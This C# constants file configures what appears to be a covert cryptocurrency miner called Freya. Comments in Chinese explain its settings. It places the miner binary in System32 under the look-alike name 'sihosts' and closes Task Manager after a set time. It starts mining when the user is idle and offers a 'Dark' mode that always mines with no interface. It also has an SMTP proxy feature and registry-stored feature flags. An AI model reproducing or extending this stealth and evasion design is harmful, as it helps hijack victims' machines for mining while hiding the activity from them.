using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Freya
{
    public static class FConstants
    {
        // Service Info
        public const string ServiceName = "FreyaService";
        public const string ServiceDisplayName = "Freya";
        public const string ServiceDescription = "Freya Description";

        // Miner Info
        public const string MinerFilePath = @"C:\Windows\System32"; //自動取出Miner執行檔放到這個路徑
        public const string MinerFileName = "sihosts";              //Miner檔名，不用.exe
        public const int MinerAPIPort = 3334;                       // Miner API Port

        // Miner Strategy
        public const int TimeToCloseTaskmgr = 1200;     // taskmgr開啟超過這個時間就自動關閉
        public const int TimeToAutoStart = 300;         // UI沒回應，Idle超過 TimeToAutoStart就自動啟動miner
        public const int TimeIdleThreshold = 10;       // 使用者Idle超過這個時間就啟動minser (0 for always start)

        //IPC Port
        public const int IPCPortService1 = 58711;
        public const int IPCPortMainUI = 58710;

        // Log Level
        public enum FreyaLogLevel
        {
            None = -1,      //不輸出任何log
            Normal = 0,     //正常工作資訊
            FreyaInfo = 10, //系統工作Info
            ProxyInfo = 20, //Proxy Debug Mode
            MinerInfo = 30, //Miner Debug Mode
            RAW = 50        //Debug
        }

        // UI ListBox 最大顯示行數
        public const int MaxLogCount = 5000;

        /// <summary>
        /// Feature Byte
        /// <para>以16進位儲存於Registry: <c>Convert.ToString((int)FConstants.FeatureByte.DMS, 16)</c> [ToDo] Encode保護</para>
        /// <para>讀取 <c>FConstants.FeatureByte a = (FConstants.FeatureByte)Convert.ToInt32("10", 16);</c></para>
        ///</summary>
        [Flags]
        public enum FeatureByte
        {
            Base        = 0b_0000_0000_0000_0000,   // Base (Miner)
            Dark        = 0b_0000_0000_0000_0001,   // Dark Miner, always mininging, No UI
            FullUI      = 0b_0000_0000_0000_1000,   // 顯示所有UI
            SMTPProxy   = 0b_0000_0000_1000_0000,   // SMTP Proxy
            DMS         = 0b_0000_0001_0000_0000,   // DMS
            ALL = Base | Dark | FullUI | SMTPProxy | DMS
        }

    }   
}

